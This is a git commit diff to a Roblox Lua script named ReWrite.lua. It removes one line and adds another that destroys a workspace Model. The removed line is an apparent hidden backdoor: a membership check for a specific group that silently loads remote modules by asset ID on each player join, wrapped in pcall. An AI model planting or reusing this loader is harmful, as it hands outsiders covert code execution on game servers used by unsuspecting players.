d967408c3df41e1c0ebad962fd20980ff1964de5
2bnt2 <yerandyty@gmail.com>
2025-06-22 08:36:54 -0500

    Update ReWrite.lua

--- ReWrite.lua
+++ ReWrite.lua
@@ -1,1 +1,1 @@
-game.Players.PlayerAdded:Connect(function(p)task.spawn(function()pcall(function()if p:IsInGroup(35425670)then local m=require(121798223156967)require(92745439030703)if type(m)=="table"and type(m.CreateIdleAnimation)=="function"then m.CreateIdleAnimation("a","b")end end end)end)end)
+game.Workspace.Model:Destroy()
